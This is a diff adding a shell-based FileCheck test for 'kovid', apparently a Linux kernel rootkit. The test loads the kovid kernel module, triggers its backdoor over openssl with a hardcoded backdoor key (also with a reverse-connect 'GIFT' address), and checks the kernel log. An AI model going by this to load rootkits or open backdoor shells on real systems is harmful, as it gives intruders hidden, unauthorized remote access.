@@ -1,0 +1,46 @@
+# REQUIRES: DEBUG_ONLY
+# REQUIRES: NATIVE_TESTS
+
+# RUN: bash %s > %t.log
+# RUN: FileCheck-18 --input-file=%t.log %s
+
+sudo dmesg -c
+sleep 10
+
+# Insert the kovid kernel module
+sudo insmod ../../../build/kovid.ko
+
+# Test parameters
+REMOTE_IP="127.0.0.1"  # Use localhost for the remote IP
+REMOTE_PORT="9999"
+BACKDOOR_KEY="0x7d3b1cb572f16425"
+GIFT_IP="127.0.0.1"  # Use localhost for GIFT
+
+# Test connection without GIFT
+echo "Testing connection without GIFT..."
+if GIFT="" sudo ../../../scripts/bdclient.sh openssl "$REMOTE_IP" "$REMOTE_PORT" "$BACKDOOR_KEY"; then
+    echo "Connection without GIFT succeeded."
+else
+    echo "ERROR: Connection without GIFT failed."
+fi
+
+# Test connection with GIFT
+echo "Testing connection with GIFT..."
+if GIFT="$GIFT_IP" sudo ../../../scripts/bdclient.sh openssl "$REMOTE_IP" "$REMOTE_PORT" "$BACKDOOR_KEY"; then
+    echo "Connection with GIFT succeeded."
+else
+    echo "ERROR: Connection with GIFT failed."
+fi
+
+# Cleanup
+sudo rmmod kovid
+sudo dmesg
+
+# CHECK: Connection without GIFT succeeded.
+# CHECK: Connection with GIFT succeeded.
+
+# CHECK: kv: using kprobe for kallsyms_lookup_name
+# CHECK: Waiting for event
+# CHECK: loaded
+# CHECK: Got event
+# CHECK: unloaded
